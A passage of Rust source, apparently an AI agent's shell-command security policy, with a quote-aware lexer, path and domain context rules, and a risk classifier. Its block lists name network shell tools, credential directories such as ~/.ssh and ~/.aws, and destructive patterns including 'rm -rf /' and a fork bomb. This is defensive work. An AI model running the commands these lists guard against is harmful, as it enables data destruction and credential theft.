                "mv".into(),
                "ls".into(),
                "cat".into(),
                "grep".into(),
                "find".into(),
                "echo".into(),
                "pwd".into(),
                "wc".into(),
                "head".into(),
                "tail".into(),
                "date".into(),
            ],
            unrestricted_commands: Vec::new(),
            command_context_rules: Vec::new(),
            forbidden_paths: vec![
                // System directories (blocked even when workspace_only=false)
                "/etc".into(),
                "/root".into(),
                "/home".into(),
                "/usr".into(),
                "/bin".into(),
                "/sbin".into(),
                "/lib".into(),
                "/opt".into(),
                "/boot".into(),
                "/dev".into(),
                "/proc".into(),
                "/sys".into(),
                "/var".into(),
                "/tmp".into(),
                "/mnt".into(),
                // Sensitive dotfiles
                "~/.ssh".into(),
                "~/.gnupg".into(),
                "~/.aws".into(),
                "~/.config".into(),
            ],
            allowed_roots: Vec::new(),
            max_actions_per_hour: 100,
            max_cost_per_day_cents: 1000,
            require_approval_for_medium_risk: true,
            block_high_risk_commands: true,
            allow_unsafe_shell_structures: false,
            shell_env_passthrough: vec![],
            allow_sensitive_file_reads: false,
            allow_sensitive_file_writes: false,
            tracker: ActionTracker::new(),
        }
    }
}

fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
        .or_else(|| directories::UserDirs::new().map(|dirs| dirs.home_dir().to_path_buf()))
}

fn expand_user_path(path: &str) -> PathBuf {
    if path == "~" {
        if let Some(home) = home_dir() {
            return home;
        }
    }

    if let Some(stripped) = path.strip_prefix("~/") {
        if let Some(home) = home_dir() {
            return home.join(stripped);
        }
    }

    PathBuf::from(path)
}

fn is_policy_absolute_path(raw_path: &str, expanded_path: &Path) -> bool {
    expanded_path.is_absolute()
        || raw_path.starts_with('/')
        || raw_path.starts_with('\\')
        || raw_path
            .as_bytes()
            .get(1)
            .is_some_and(|separator| *separator == b':')
            && raw_path
                .as_bytes()
                .get(2)
                .is_some_and(|separator| matches!(*separator, b'\\' | b'/'))
}

fn split_shell_words(command: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut quote = QuoteState::None;
    let mut escaped = false;

    let push_word = |words: &mut Vec<String>, current: &mut String| {
        if !current.is_empty() {
            words.push(current.clone());
            current.clear();
        }
    };

    for ch in command.chars() {
        match quote {
            QuoteState::Single => {
                current.push(ch);
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                current.push(ch);
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    current.push(ch);
                    escaped = false;
                    continue;
                }

                match ch {
                    '\\' => {
                        current.push(ch);
                        escaped = true;
                    }
                    '\'' => {
                        current.push(ch);
                        quote = QuoteState::Single;
                    }
                    '"' => {
                        current.push(ch);
                        quote = QuoteState::Double;
                    }
                    c if c.is_whitespace() => push_word(&mut words, &mut current),
                    _ => current.push(ch),
                }
            }
        }
    }

    push_word(&mut words, &mut current);
    words
}

// ── Shell Command Parsing Utilities ───────────────────────────────────────
// These helpers implement a minimal quote-aware shell lexer. They exist
// because security validation must reason about the *structure* of a
// command (separators, operators, quoting) rather than treating it as a
// flat string — otherwise an attacker could hide dangerous sub-commands
// inside quoted arguments or chained operators.
/// Skip leading environment variable assignments (e.g. `FOO=bar cmd args`).
/// Returns the remainder starting at the first non-assignment word.
fn skip_env_assignments(s: &str) -> &str {
    let mut rest = s;
    loop {
        let Some(word) = rest.split_whitespace().next() else {
            return rest;
        };
        // Environment assignment: contains '=' and starts with a letter or underscore
        if word.contains('=')
            && word
                .chars()
                .next()
                .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        {
            // Advance past this word
            rest = rest[word.len()..].trim_start();
        } else {
            return rest;
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum QuoteState {
    None,
    Single,
    Double,
}

/// Split a shell command into sub-commands by unquoted separators.
///
/// Separators:
/// - `;` and newline
/// - `|`
/// - `&&`, `||`
///
/// Characters inside single or double quotes are treated as literals, so
/// `sqlite3 db "SELECT 1; SELECT 2;"` remains a single segment.
fn split_unquoted_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let mut chars = command.chars().peekable();

    let push_segment = |segments: &mut Vec<String>, current: &mut String| {
        let trimmed = current.trim();
        if !trimmed.is_empty() {
            segments.push(trimmed.to_string());
        }
        current.clear();
    };

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
                current.push(ch);
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    current.push(ch);
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    current.push(ch);
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
                current.push(ch);
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    current.push(ch);
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    current.push(ch);
                    continue;
                }

                match ch {
                    '\'' => {
                        quote = QuoteState::Single;
                        current.push(ch);
                    }
                    '"' => {
                        quote = QuoteState::Double;
                        current.push(ch);
                    }
                    ';' | '\n' => push_segment(&mut segments, &mut current),
                    '|' => {
                        if chars.next_if_eq(&'|').is_some() {
                            // Consume full `||`; both characters are separators.
                        }
                        push_segment(&mut segments, &mut current);
                    }
                    '&' => {
                        if chars.next_if_eq(&'&').is_some() {
                            // `&&` is a separator; single `&` is handled separately.
                            push_segment(&mut segments, &mut current);
                        } else {
                            current.push(ch);
                        }
                    }
                    _ => current.push(ch),
                }
            }
        }
    }

    let trimmed = current.trim();
    if !trimmed.is_empty() {
        segments.push(trimmed.to_string());
    }

    segments
}

/// Detect a single unquoted `&` operator (background/chain). `&&` is allowed.
///
/// We treat any standalone `&` as unsafe in policy validation because it can
/// chain hidden sub-commands and escape foreground timeout expectations.
fn contains_unquoted_single_ampersand(command: &str) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let mut chars = command.chars().peekable();

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                match ch {
                    '\'' => quote = QuoteState::Single,
                    '"' => quote = QuoteState::Double,
                    '&' => {
                        if chars.next_if_eq(&'&').is_none() {
                            return true;
                        }
                    }
                    _ => {}
                }
            }
        }
    }

    false
}

/// Detect an unquoted character in a shell command.
fn contains_unquoted_char(command: &str, target: char) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;

    for ch in command.chars() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                match ch {
                    '\'' => quote = QuoteState::Single,
                    '"' => quote = QuoteState::Double,
                    _ if ch == target => return true,
                    _ => {}
                }
            }
        }
    }

    false
}

/// Detect unquoted shell variable expansions like `$HOME`, `$1`, `$?`.
///
/// Escaped dollars (`\$`) are ignored. Variables inside single quotes are
/// treated as literals and therefore ignored.
fn contains_unquoted_shell_variable_expansion(command: &str) -> bool {
    let mut quote = QuoteState::None;
    let mut escaped = false;
    let chars: Vec<char> = command.chars().collect();

    for i in 0..chars.len() {
        let ch = chars[i];

        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                }
                continue;
            }
            QuoteState::Double => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::None;
                    continue;
                }
            }
            QuoteState::None => {
                if escaped {
                    escaped = false;
                    continue;
                }
                if ch == '\\' {
                    escaped = true;
                    continue;
                }
                if ch == '\'' {
                    quote = QuoteState::Single;
                    continue;
                }
                if ch == '"' {
                    quote = QuoteState::Double;
                    continue;
                }
            }
        }

        if ch != '$' {
            continue;
        }

        let Some(next) = chars.get(i + 1).copied() else {
            continue;
        };
        if next.is_ascii_alphanumeric()
            || matches!(
                next,
                '_' | '{' | '(' | '#' | '?' | '!' | '$' | '*' | '@' | '-'
            )
        {
            return true;
        }
    }

    false
}

fn strip_wrapping_quotes(token: &str) -> &str {
    token.trim_matches(|c| c == '"' || c == '\'')
}

fn looks_like_path(candidate: &str) -> bool {
    candidate.starts_with('/')
        || candidate.starts_with("./")
        || candidate.starts_with("../")
        || candidate.starts_with('~')
        || candidate == "."
        || candidate == ".."
        || candidate.contains('/')
}

fn attached_short_option_value(token: &str) -> Option<&str> {
    // Examples:
    // -f/etc/passwd   -> /etc/passwd
    // -C../outside    -> ../outside
    // -I./include     -> ./include
    let body = token.strip_prefix('-')?;
    if body.starts_with('-') || body.len() < 2 {
        return None;
    }
    let value = body[1..].trim_start_matches('=').trim();
    if value.is_empty() {
        None
    } else {
        Some(value)
    }
}

fn redirection_target(token: &str) -> Option<&str> {
    let marker_idx = token.find(['<', '>'])?;
    let mut rest = &token[marker_idx + 1..];
    rest = rest.trim_start_matches(['<', '>']);
    rest = rest.trim_start_matches('&');
    rest = rest.trim_start_matches(|c: char| c.is_ascii_digit());
    let trimmed = rest.trim();
    if trimmed.is_empty() {
        None
    } else {
        Some(trimmed)
    }
}

fn is_allowlist_entry_match(allowed: &str, executable: &str, executable_base: &str) -> bool {
    let allowed = strip_wrapping_quotes(allowed).trim();
    if allowed.is_empty() {
        return false;
    }

    // Explicit wildcard support for "allow any command name/path".
    if allowed == "*" {
        return true;
    }

    // Path-like allowlist entries must match the executable token exactly
    // after "~" expansion.
    if looks_like_path(allowed) {
        let allowed_path = expand_user_path(allowed);
        let executable_path = expand_user_path(executable);
        return executable_path == allowed_path;
    }

    // Command-name entries continue to match by basename.
    allowed == executable_base
}

struct CommandContextSegmentEval<'a> {
    has_matching_rules: bool,
    allow_rule_count: usize,
    first_allow_rule: Option<&'a crate::config::CommandContextRuleConfig>,
    matched_allow: Option<&'a crate::config::CommandContextRuleConfig>,
    matched_deny: Option<&'a crate::config::CommandContextRuleConfig>,
}

impl<'a> CommandContextSegmentEval<'a> {
    fn has_matched_deny(&self) -> bool {
        self.matched_deny.is_some()
    }

    fn has_allow_miss(&self) -> bool {
        self.allow_rule_count > 0 && self.matched_allow.is_none()
    }

    fn blocks_command_gate(&self) -> bool {
        self.has_matched_deny() || self.has_allow_miss()
    }
}

type CommandSegment = (String, String, Vec<String>);

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum CommandPolicyMode {
    Standard,
    Unrestricted,
}

impl CommandPolicyMode {
    fn from_command(policy: &SecurityPolicy, command: &str) -> Self {
        if policy.matches_unrestricted_command(command) {
            Self::Unrestricted
        } else {
            Self::Standard
        }
    }

    fn is_unrestricted(self) -> bool {
        matches!(self, Self::Unrestricted)
    }
}

struct CommandPolicyEvaluation<'a> {
    command: &'a str,
    segments: Vec<CommandSegment>,
    context_evals: Option<Vec<CommandContextSegmentEval<'a>>>,
    allow_high_risk_by_context: bool,
    mode: CommandPolicyMode,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct CommandPolicyAssessment {
    risk: CommandRiskLevel,
    mode: CommandPolicyMode,
}

impl CommandPolicyAssessment {
    const fn standard(risk: CommandRiskLevel) -> Self {
        Self {
            risk,
            mode: CommandPolicyMode::Standard,
        }
    }

    const fn unrestricted() -> Self {
        Self {
            risk: CommandRiskLevel::Low,
            mode: CommandPolicyMode::Unrestricted,
        }
    }

    const fn risk(self) -> CommandRiskLevel {
        self.risk
    }

    const fn allows_execution(self) -> bool {
        matches!(
            self.mode,
            CommandPolicyMode::Standard | CommandPolicyMode::Unrestricted
        )
    }
}

impl SecurityPolicy {
    fn build_command_policy_evaluation<'a>(
        &'a self,
        command: &'a str,
    ) -> Result<CommandPolicyEvaluation<'a>, CommandPolicyViolation> {
        let mode = CommandPolicyMode::from_command(self, command);
        self.run_command_prechecks(command, mode)?;
        let segments = Self::collect_command_segments(command);
        let (context_evals, allow_high_risk_by_context) =
            self.evaluate_command_context_gate(command, &segments, mode)?;
        let evaluation = CommandPolicyEvaluation {
            command,
            segments,
            context_evals,
            allow_high_risk_by_context,
            mode,
        };
        self.validate_command_allowlist_stage(&evaluation)?;
        Ok(evaluation)
    }

    fn run_command_prechecks(
        &self,
        command: &str,
        mode: CommandPolicyMode,
    ) -> Result<(), CommandPolicyViolation> {
        if mode.is_unrestricted() {
            return Ok(());
        }
        for precheck in [
            Self::validate_command_autonomy_precheck,
            Self::validate_command_shell_structure_precheck,
        ] {
            precheck(self, command)?;
        }
        Ok(())
    }

    fn evaluate_command_context_segment<'a>(
        &'a self,
        executable: &str,
        base_cmd: &str,
        args: &[String],
    ) -> CommandContextSegmentEval<'a> {
        let mut has_matching_rules = false;
        let mut allow_rule_count = 0usize;
        let mut first_allow_rule = None;
        let mut matched_allow = None;
        let mut matched_deny = None;

        for rule in &self.command_context_rules {
            if !Self::command_rule_matches_command(rule, executable, base_cmd) {
                continue;
            }
            has_matching_rules = true;
            match rule.action {
                crate::config::CommandContextRuleAction::Deny => {
                    if self.command_rule_matches_context(rule, args) {
                        matched_deny = Some(rule);
                        break;
                    }
                }
                crate::config::CommandContextRuleAction::Allow => {
                    allow_rule_count += 1;
                    if first_allow_rule.is_none() {
                        first_allow_rule = Some(rule);
                    }
                    if matched_allow.is_none() && self.command_rule_matches_context(rule, args) {
                        matched_allow = Some(rule);
                    }
                }
            }
        }

        CommandContextSegmentEval {
            has_matching_rules,
            allow_rule_count,
            first_allow_rule,
            matched_allow,
            matched_deny,
        }
    }

    fn evaluate_command_context_segments<'a>(
        &'a self,
        segments: &[CommandSegment],
    ) -> Vec<CommandContextSegmentEval<'a>> {
        segments
            .iter()
            .map(|(executable, base_cmd, args)| {
                self.evaluate_command_context_segment(executable, base_cmd, args)
            })
            .collect()
    }

    fn normalize_segment_args(segment: &str) -> Vec<String> {
        split_shell_words(skip_env_assignments(segment))
            .into_iter()
            .skip(1)
            .map(|token| strip_wrapping_quotes(&token).trim().to_string())
            .filter(|token| !token.is_empty())
            .collect()
    }

    fn collect_command_segments(command: &str) -> Vec<CommandSegment> {
        split_unquoted_segments(command)
            .into_iter()
            .filter_map(|segment| {
                let (executable, base_cmd) = Self::segment_command_parts(&segment)?;
                let args = Self::normalize_segment_args(&segment);
                Some((executable, base_cmd, args))
            })
            .collect()
    }

    fn segment_command_parts(segment: &str) -> Option<(String, String)> {
        let cmd_part = skip_env_assignments(segment);
        let words = split_shell_words(cmd_part);
        let executable = strip_wrapping_quotes(words.first()?).trim();
        if executable.is_empty() {
            return None;
        }
        let base_cmd = executable.rsplit('/').next().unwrap_or("").trim();
        if base_cmd.is_empty() {
            return None;
        }
        Some((executable.to_string(), base_cmd.to_string()))
    }

    fn command_rule_matches_command(
        rule: &crate::config::CommandContextRuleConfig,
        executable: &str,
        base_cmd: &str,
    ) -> bool {
        is_allowlist_entry_match(rule.command.trim(), executable, base_cmd)
    }

    fn host_matches_pattern(host: &str, pattern: &str) -> bool {
        let host = host.to_ascii_lowercase();
        let pattern = pattern.trim().to_ascii_lowercase();
        if let Some(suffix) = pattern.strip_prefix("*.") {
            return host == suffix || host.ends_with(&format!(".{suffix}"));
        }
        host == pattern
    }

    fn command_rule_domain_constraint_match(
        rule: &crate::config::CommandContextRuleConfig,
        args: &[String],
    ) -> bool {
        if rule.allowed_domains.is_empty() {
            return true;
        }

        let hosts: Vec<String> = args
            .iter()
            .filter_map(|arg| {
                let parsed = reqwest::Url::parse(arg).ok()?;
                parsed.host_str().map(|h| h.to_ascii_lowercase())
            })
            .collect();
        if hosts.is_empty() {
            return false;
        }

        hosts.iter().all(|host| {
            rule.allowed_domains
                .iter()
                .any(|pattern| Self::host_matches_pattern(host, pattern))
        })
    }

    fn resolve_rule_prefix(&self, prefix: &str) -> PathBuf {
        self.resolve_policy_path(prefix.trim())
    }

    fn strongest_matching_rule_prefix(&self, prefixes: &[String], path: &Path) -> Option<PathBuf> {
        prefixes
            .iter()
            .map(|prefix| self.resolve_rule_prefix(prefix))
            .filter(|prefix| path.starts_with(prefix))
            .max_by_key(|prefix| prefix.components().count())
    }

    fn command_rule_explicit_path_policy_allows(
        &self,
        rule: &crate::config::CommandContextRuleConfig,
        path: &Path,
    ) -> Option<bool> {
        let allowed = self.strongest_matching_rule_prefix(&rule.allowed_path_prefixes, path);
        let denied = self.strongest_matching_rule_prefix(&rule.denied_path_prefixes, path);

        match (allowed, denied) {
            (Some(allowed_prefix), Some(denied_prefix)) => {
                let allowed_depth = allowed_prefix.components().count();
                let denied_depth = denied_prefix.components().count();
                Some(allowed_depth > denied_depth)
            }
            (Some(_), None) => Some(true),
            (None, Some(_)) => Some(false),
            (None, None) => None,
        }
    }

    fn resolve_arg_path<'a>(&self, raw: &'a str) -> Option<Cow<'a, str>> {
        let candidate = strip_wrapping_quotes(raw).trim();
        if candidate.is_empty() || candidate.contains("://") {
            return None;
        }
        if candidate.starts_with('-') {
            if let Some((_, value)) = candidate.split_once('=') {
                let trimmed = value.trim();
                if !trimmed.is_empty() {
                    return Some(Cow::Owned(trimmed.to_string()));
                }
            }
            if let Some(value) = attached_short_option_value(candidate) {
                return Some(Cow::Owned(value.to_string()));
            }
            return None;
        }
        if let Some(target) = redirection_target(candidate) {
            let trimmed = target.trim();
            if trimmed.is_empty() {
                return None;
            }
            return Some(Cow::Owned(trimmed.to_string()));
        }
        if looks_like_path(candidate) {
            return Some(Cow::Borrowed(candidate));
        }
        None
    }

    fn command_rule_path_constraint_match(
        &self,
        rule: &crate::config::CommandContextRuleConfig,
        args: &[String],
    ) -> bool {
        let path_args: Vec<PathBuf> = args
            .iter()
            .filter_map(|arg| self.resolve_arg_path(arg))
            .map(|raw| {
                let expanded = expand_user_path(raw.as_ref());
                if expanded.is_absolute() {
                    expanded
                } else {
                    self.workspace_dir.join(expanded)
                }
            })
            .collect();

        if rule.action == crate::config::CommandContextRuleAction::Allow {
            if !rule.allowed_path_prefixes.is_empty() {
                if path_args.is_empty() {
                    return false;
                }
                if !path_args.iter().all(|path| {
                    self.command_rule_explicit_path_policy_allows(rule, path) == Some(true)
                }) {
                    return false;
                }
            } else if path_args.iter().any(|path| {
                self.command_rule_explicit_path_policy_allows(rule, path) == Some(false)
            }) {
                return false;
            }

            return true;
        }

        if !rule.allowed_path_prefixes.is_empty() {
            if path_args.is_empty() {
                return false;
            }
            let allowed_prefixes: Vec<PathBuf> = rule
                .allowed_path_prefixes
                .iter()
                .map(|prefix| self.resolve_rule_prefix(prefix))
                .collect();
            if !path_args.iter().all(|path| {
                allowed_prefixes
                    .iter()
                    .any(|prefix| path.starts_with(prefix))
            }) {
                return false;
            }
        }

        if !rule.denied_path_prefixes.is_empty() {
            let denied_prefixes: Vec<PathBuf> = rule
                .denied_path_prefixes
                .iter()
                .map(|prefix| self.resolve_rule_prefix(prefix))
                .collect();
            if path_args.is_empty() {
                return false;
            }
            return path_args.iter().any(|path| {
                denied_prefixes
                    .iter()
                    .any(|prefix| path.starts_with(prefix))
            });
        }

        true
    }

    fn command_rule_matches_context(
        &self,
        rule: &crate::config::CommandContextRuleConfig,
        args: &[String],
    ) -> bool {
        Self::command_rule_domain_constraint_match(rule, args)
            && self.command_rule_path_constraint_match(rule, args)
    }

    fn command_context_rule_action_label(
        action: crate::config::CommandContextRuleAction,
    ) -> &'static str {
        match action {
            crate::config::CommandContextRuleAction::Allow => "allow",
            crate::config::CommandContextRuleAction::Deny => "deny",
        }
    }

    fn command_context_rule_constraint_summary(
        rule: &crate::config::CommandContextRuleConfig,
    ) -> String {
        let mut parts = Vec::new();
        parts.push(format!(
            "rule_action={}",
            Self::command_context_rule_action_label(rule.action)
        ));
        parts.push(format!("rule_command={}", rule.command.trim()));
        if !rule.allowed_domains.is_empty() {
            parts.push(format!(
                "allowed_domains={}",
                rule.allowed_domains.join(",")
            ));
        }
        if !rule.allowed_path_prefixes.is_empty() {
            parts.push(format!(
                "allowed_path_prefixes={}",
                rule.allowed_path_prefixes.join(",")
            ));
        }
        if !rule.denied_path_prefixes.is_empty() {
            parts.push(format!(
                "denied_path_prefixes={}",
                rule.denied_path_prefixes.join(",")
            ));
        }
        if rule.allow_high_risk {
            parts.push("allow_high_risk=true".to_string());
        }
        parts.join("; ")
    }

    fn command_context_rule_index(
        &self,
        target: &crate::config::CommandContextRuleConfig,
    ) -> Option<usize> {
        self.command_context_rules
            .iter()
            .position(|rule| std::ptr::eq(rule, target))
    }

    fn command_context_rule_detail(
        &self,
        rule: &crate::config::CommandContextRuleConfig,
    ) -> String {
        let summary = Self::command_context_rule_constraint_summary(rule);
        match self.command_context_rule_index(rule) {
            Some(index) => format!("rule_index={index}; {summary}"),
            None => summary,
        }
    }

    fn command_context_observed_summary(&self, args: &[String]) -> String {
        let mut hosts: Vec<String> = args
            .iter()
            .filter_map(|arg| {
                let parsed = reqwest::Url::parse(arg).ok()?;
                parsed.host_str().map(|h| h.to_ascii_lowercase())
            })
            .collect();
        hosts.sort();
        hosts.dedup();

        let mut paths: Vec<String> = args
            .iter()
            .filter_map(|arg| self.resolve_arg_path(arg))
            .map(|raw| {
                let expanded = expand_user_path(raw.as_ref());
                if expanded.is_absolute() {
                    expanded
                } else {
                    self.workspace_dir.join(expanded)
                }
            })
            .map(|path| path.display().to_string())
            .collect();
        paths.sort();
        paths.dedup();

        let hosts = if hosts.is_empty() {
            "none".to_string()
        } else {
            hosts.join(",")
        };
        let paths = if paths.is_empty() {
            "none".to_string()
        } else {
            paths.join(",")
        };

        format!("observed_hosts={hosts}; observed_paths={paths}")
    }

    fn command_context_rules_block_violation(
        &self,
        reason: impl Into<String>,
        command: &str,
    ) -> CommandPolicyViolation {
        CommandPolicyViolation::new(COMMAND_CONTEXT_RULES_POLICY_ID, reason, command)
    }

    fn command_context_reason_context_suffix(&self, rule_detail: &str, args: &[String]) -> String {
        format!(
            "command_context={rule_detail}; observed_context={}",
            self.command_context_observed_summary(args)
        )
    }

    fn command_context_rules_block_reason(
        &self,
        headline: &str,
        base_cmd: &str,
        rule_detail: &str,
        extra_fields: Option<&str>,
        args: &[String],
    ) -> String {
        let context_suffix = self.command_context_reason_context_suffix(rule_detail, args);
        match extra_fields {
            Some(extra) => format!(
                "Command blocked by command_context_rules: {headline}; segment_command={base_cmd}; {extra}; {context_suffix}",
            ),
            None => format!(
                "Command blocked by command_context_rules: {headline}; segment_command={base_cmd}; {context_suffix}",
            ),
        }
    }

    fn command_context_rules_deny_reason(
        &self,
        rule: &crate::config::CommandContextRuleConfig,
        base_cmd: &str,
        args: &[String],
    ) -> String {
        let rule_detail = self.command_context_rule_detail(rule);
        let headline = format!("deny rule matched for '{}'", rule.command.trim());
        self.command_context_rules_block_reason(&headline, base_cmd, &rule_detail, None, args)
    }

    fn command_context_rules_allow_miss_reason(
        &self,
        base_cmd: &str,
        allow_rule_count: usize,
        first_allow_rule: &crate::config::CommandContextRuleConfig,
        args: &[String],
    ) -> String {
        let first_rule_detail = self.command_context_rule_detail(first_allow_rule);
        let headline = format!("no allow rule matched constraints for '{}'", base_cmd);
        let extra_fields =
            format!("allow_rule_count={allow_rule_count}; first_allow_rule={first_rule_detail}");
        self.command_context_rules_block_reason(
            &headline,
            base_cmd,
            &first_rule_detail,
            Some(&extra_fields),
            args,
        )
    }

    fn command_context_rules_violation_with_evals(
        &self,
        command: &str,
        segments: &[CommandSegment],
        evals: &[CommandContextSegmentEval<'_>],
    ) -> Result<bool, CommandPolicyViolation> {
        let mut allow_high_risk = false;

        for ((_, base_cmd, args), eval) in segments.iter().zip(evals.iter()) {
            if !eval.has_matching_rules {
                continue;
            }

            if let Some(rule) = eval.matched_deny {
                return Err(self.command_context_rules_block_violation(
                    self.command_context_rules_deny_reason(rule, base_cmd, args),
                    command,
                ));
            }

            if eval.has_allow_miss() {
                return Err(self.command_context_rules_block_violation(
                    self.command_context_rules_allow_miss_reason(
                        base_cmd,
                        eval.allow_rule_count,
                        eval.first_allow_rule
                            .expect("first_allow_rule must exist when allow_rule_count > 0"),
                        args,
                    ),
                    command,
                ));
            }

            if let Some(rule) = eval.matched_allow {
                if rule.allow_high_risk {
                    allow_high_risk = true;
                }
            }
        }

        Ok(allow_high_risk)
    }

    fn segment_is_allowlisted_or_context_allowed(
        &self,
        executable: &str,
        base_cmd: &str,
        eval: &CommandContextSegmentEval<'_>,
    ) -> bool {
        let allowlisted = self
            .allowed_commands
            .iter()
            .any(|allowed| is_allowlist_entry_match(allowed, executable, base_cmd));
        if eval.blocks_command_gate() {
            return false;
        }
        allowlisted || eval.matched_allow.is_some()
    }

    fn segment_passes_allowlist_phase(
        &self,
        executable: &str,
        base_cmd: &str,
        args: &[String],
        eval: Option<&CommandContextSegmentEval<'_>>,
    ) -> bool {
        let lowered_args: Vec<String> = args.iter().map(|arg| arg.to_ascii_lowercase()).collect();
        if !self.is_args_safe(base_cmd, &lowered_args) {
            return false;
        }

        match eval {
            Some(eval) => {
                self.segment_is_allowlisted_or_context_allowed(executable, base_cmd, eval)
            }
            None => self
                .allowed_commands
                .iter()
                .any(|allowed| is_allowlist_entry_match(allowed, executable, base_cmd)),
        }
    }

    fn first_allowlist_blocked_segment<'a>(
        &self,
        segments: &'a [CommandSegment],
        evals: Option<&[CommandContextSegmentEval<'_>]>,
    ) -> Option<(&'a str, &'a str)> {
        for (index, (executable, base_cmd, args)) in segments.iter().enumerate() {
            let eval = evals.and_then(|values| values.get(index));
            if !self.segment_passes_allowlist_phase(executable, base_cmd, args, eval) {
                return Some((executable.as_str(), base_cmd.as_str()));
            }
        }

        None
    }

    fn allowed_commands_block_reason(
        &self,
        command: &str,
        segments: &[CommandSegment],
        evals: Option<&[CommandContextSegmentEval<'_>]>,
    ) -> String {
        let (executable, segment_command) = self
            .first_allowlist_blocked_segment(segments, evals)
            .unwrap_or((NO_COMMAND_FRAGMENT, NO_COMMAND_FRAGMENT));
        let context_override = if self.command_context_rules.is_empty() {
            "none"
        } else {
            COMMAND_CONTEXT_RULES_POLICY_ID
        };

        format!(
            "Command not allowed by security policy: Command blocked by allowed_commands: no entry in autonomy.allowed_commands matched executable={executable}; segment_command={segment_command}; context_override={context_override}; full_command={command}"
        )
    }

    // ── Risk Classification ──────────────────────────────────────────────
    // Risk is assessed per-segment (split on shell operators), and the
    // highest risk across all segments wins. This prevents bypasses like
    // `ls && rm -rf /` from being classified as Low just because `ls` is safe.

    /// Classify command risk. Any high-risk segment marks the whole command high.
    pub fn command_risk_level(&self, command: &str) -> CommandRiskLevel {
        let mut saw_medium = false;

        for segment in split_unquoted_segments(command) {
            let cmd_part = skip_env_assignments(&segment);
            let mut words = cmd_part.split_whitespace();
            let Some(base_raw) = words.next() else {
                continue;
            };

            let base = base_raw
                .rsplit('/')
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();

            let args: Vec<String> = words.map(|w| w.to_ascii_lowercase()).collect();
            let joined_segment = cmd_part.to_ascii_lowercase();

            // High-risk commands
            if matches!(
                base.as_str(),
                "rm" | "mkfs"
                    | "dd"
                    | "shutdown"
                    | "reboot"
                    | "halt"
                    | "poweroff"
                    | "sudo"
                    | "su"
                    | "chown"
                    | "chmod"
                    | "useradd"
                    | "userdel"
                    | "usermod"
                    | "passwd"
                    | "mount"
                    | "umount"
                    | "iptables"
                    | "ufw"
                    | "firewall-cmd"
                    | "curl"
                    | "wget"
                    | "nc"
                    | "ncat"
                    | "netcat"
                    | "scp"
                    | "ssh"
                    | "ftp"
                    | "telnet"
            ) {
                return CommandRiskLevel::High;
            }

            if joined_segment.contains("rm -rf /")
                || joined_segment.contains("rm -fr /")
                || joined_segment.contains(":(){:|:&};:")
            {
                return CommandRiskLevel::High;
            }

            // Medium-risk commands (state-changing, but not inherently destructive)
            let medium = match base.as_str() {
                "git" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "commit"
                            | "push"
                            | "reset"
                            | "clean"
                            | "rebase"
                            | "merge"
                            | "cherry-pick"
                            | "revert"
                            | "branch"
                            | "checkout"
                            | "switch"
                            | "tag"
                    )
                }),
                "npm" | "pnpm" | "yarn" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "install" | "add" | "remove" | "uninstall" | "update" | "publish"
                    )
                }),
                "cargo" => args.first().is_some_and(|verb| {
                    matches!(
                        verb.as_str(),
                        "add" | "remove" | "install" | "clean" | "publish"
                    )
                }),
                "touch" | "mkdir" | "mv" | "cp" | "ln" => true,
                _ => false,
            };

            saw_medium |= medium;
        }

        if saw_medium {
            CommandRiskLevel::Medium
        } else {
            CommandRiskLevel::Low
        }
    }

    // ── Command Execution Policy Gate ──────────────────────────────────────
    // Validation follows a strict precedence order:
    //   1. Command identity/context checks (allowlist + command_context_rules)
    //   2. Risk classification (high / medium / low)
    //   3. Policy flags (block_high_risk_commands, require_approval_for_medium_risk)
    //   4. Autonomy level × approval status (supervised requires explicit approval)
    // This ordering ensures deny-by-default: unknown commands are rejected
    // before any risk or autonomy logic runs.

    /// Validate full command execution policy (allowlist + risk gate).
    pub fn validate_command_execution(
        &self,
        command: &str,
        approved: bool,
